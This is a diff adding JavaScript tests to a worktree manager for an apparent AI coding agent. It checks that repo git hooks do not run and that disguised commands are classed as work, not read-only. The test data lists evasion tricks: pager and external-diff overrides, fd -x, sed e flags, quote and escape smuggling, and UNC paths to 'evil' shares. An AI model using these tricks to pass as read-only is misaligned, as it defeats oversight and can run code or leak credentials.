@@ -123,6 +123,30 @@ test('the copy works on its own branch, keeps the subfolder, and leaves your che
   } finally { t.done(); }
 });
 
+test("making a copy runs none of the repo's own hooks", async () => {
+  // A pull request from a fork can add a hook to a tracked hooks folder; git
+  // would run post-checkout as you the moment the copy is made.
+  const t = setup();
+  try {
+    const marker = path.join(t.base, 'hook-ran');
+    fs.mkdirSync(path.join(t.dir, '.githooks'));
+    fs.writeFileSync(path.join(t.dir, '.githooks', 'post-checkout'), `#!/bin/sh\necho ran > "${marker.replace(/\\/g, '/')}"\n`, { mode: 0o755 });
+    t.g(t.dir, 'config', 'core.hooksPath', '.githooks');
+    t.g(t.dir, 'add', '-A');
+    t.g(t.dir, 'commit', '-qm', 'hooks');
+    // The hook really would run, so the test below proves something.
+    t.g(t.dir, 'checkout', '-q', '-b', 'probe');
+    assert.ok(fs.existsSync(marker), 'git runs this hook on a plain checkout');
+    fs.rmSync(marker);
+    t.g(t.dir, 'checkout', '-q', 'main');
+    fs.rmSync(marker, { force: true });
+
+    const made = await worktrees.create(t.dir, { home: t.home, title: 'hooked' });
+    assert.equal(made.ok, true, made.error);
+    assert.equal(fs.existsSync(marker), false, 'post-checkout ran on worktree add');
+  } finally { t.done(); }
+});
+
 test('bring it home: commits what was left, merges into the base, then tidies up', async () => {
   const t = setup();
   try {
@@ -430,6 +454,35 @@ test('only a change to files starts the work: reading and looking around do not'
     'node script.js', 'git stash', 'Set-Content a.txt hi', 'prettier --write .', '',
   ];
   for (const c of works) assert.equal(worktrees.startsWork('PowerShell', { command: c }), true, c);
+});
+
+test('commands that pass for looking but can run anything count as work', () => {
+  const works = [
+    // A script block, subexpression, array or splat runs whatever is in it.
+    'Get-ChildItem | Where-Object { Remove-Item $_ }', 'Get-ChildItem | Select-Object @{n="x";e={Remove-Item a}}',
+    'Get-Content (Remove-Item a)', 'Write-Output @(Remove-Item a)', 'Get-ChildItem @args',
+    // fd runs a command per match with -x, -X or a cluster holding one.
+    'fd -x rm', 'fd -X rm', 'fd -Hx rm', 'fd --exec-batch rm', 'fd --exec rm',
+    'find . -okdir rm {} ;', 'find . -fprintf out x',
+    // git's own config can name the pager, an external diff or where its commands live.
+    'git -c core.pager=calc log', 'git -c diff.external=calc diff', 'git --config-env=core.pager=X log',
+    'git --exec-path=. log', 'git diff --ext-diff', 'git log -p --textconv', 'git -C . -c core.pager=calc log',
+    // git takes any unambiguous start of a long option, and -O inside a cluster.
+    'git diff --ext-d', 'git diff --outp=x', 'git grep --open-files=calc x', 'git grep --op=calc x', 'git grep -iOcalc x', 'git log --textc',
+    // Quotes this check can't read the way the shell does.
+    `Write-Output ${String.fromCharCode(0x2018)}'${String.fromCharCode(0x2019)} { Remove-Item a } ${String.fromCharCode(0x2018)}'${String.fromCharCode(0x2019)}`,
+    "echo \\' { rm a } \\'", "ls # ' { x } '",
+    // The shell takes quotes and backslashes out before the program sees its flags.
+    'git diff "--ext-diff"', "git diff '--output=x'", 'git diff --ext\\-diff', 'find . "-delete"', "fd '-x' rm", 'rg "--pre" sh x',
+    // Quoted text with spaces is one word, so it can't push the real options along.
+    'git -C "x log" -c core.pager=calc log', 'git log -c', 'git "unclosed log',
+    // bash decodes escapes inside $'...' and $"...".
+    "git diff $'\x2d-ext-diff'", 'git diff $"--ext-diff"',
+  ];
+  for (const c of works) assert.equal(worktrees.startsWork('PowerShell', { command: c }), true, c);
+  // Braces and brackets inside quotes are only text.
+  const looks = ['rg "fn\\(x\\)" src', "grep '{' a.js", 'fd -H "*.js"', 'find . -name "*(1)*"', 'git -C ../x log -5'];
+  for (const c of looks) assert.equal(worktrees.startsWork('Bash', { command: c }), false, c);
 });
 
 test('the branch name comes from what Claude called the work', () => {
@@ -807,4 +860,30 @@ test('bring it home, signed: the trailer ends the commit and the merge, and a ju
     await worktrees.bringHome(w2, { message: 'feat: add e', trailer: 'not a trailer\nSigned-off-by: someone' });
     assert.equal(t.g(t.dir, 'log', '-1', '--format=%B').trim(), 'feat: add e');
   } finally { t.done(); }
+});
+
+test('the read-only check: redirects, pagers, sed scripts, GNU abbreviations, network paths and look-alike programs', () => {
+  const bs = String.fromCharCode(92);
+  const works = [
+    // A redirect that only looks harmless: >&1.txt and > nul-x are files.
+    'echo hi >&1.txt', 'echo hi > nul-x', 'ls 2>/dev/null.x',
+    // sed scripts other than printing: other delimiters, script files.
+    "sed 's,^,,e' x", "sed 's,a,b,w out.txt' x", 'sed -f x.sed y',
+    // GNU tools take any unambiguous start of a long option.
+    'sort --out=f x', 'sort --compr=sh x', 'tree -ao f', 'file -C x',
+    // Pagers and ag can run a command.
+    'ag --pager=sh x', "less '+!touch x' f", 'more f',
+    // Opening a network path sends this PC's sign-in there.
+    `cat ${bs}${bs}evil${bs}share${bs}x`, 'cat //evil/share/x', 'Get-Content --path=//evil/x',
+    // A program the repo ships under a familiar name.
+    './git log', 'scripts/cat x',
+    // git subcommands that change things after all.
+    'git remote -v add n https://x', 'git reflog expire --all', 'git reflog delete HEAD@{1}', 'rg --hostname-bin=sh x',
+  ];
+  for (const c of works) assert.equal(worktrees.startsWork('Bash', { command: c }), true, c);
+  const looks = ['ls 2>&1', 'ls >/dev/null', "sed -n '1,20p' a.txt", "sed -n '/re/p' a.txt", 'sed -n $p a.txt', 'git remote -v', 'git remote show origin', 'git reflog', 'rg "https://example.com" src', 'sort -r x'];
+  for (const c of looks) assert.equal(worktrees.startsWork('Bash', { command: c }), false, c);
+  // Monitor runs a command too.
+  assert.equal(worktrees.startsWork('Monitor', { command: 'rm -rf src' }), true);
+  assert.equal(worktrees.startsWork('Monitor', { command: 'git status' }), false);
 });
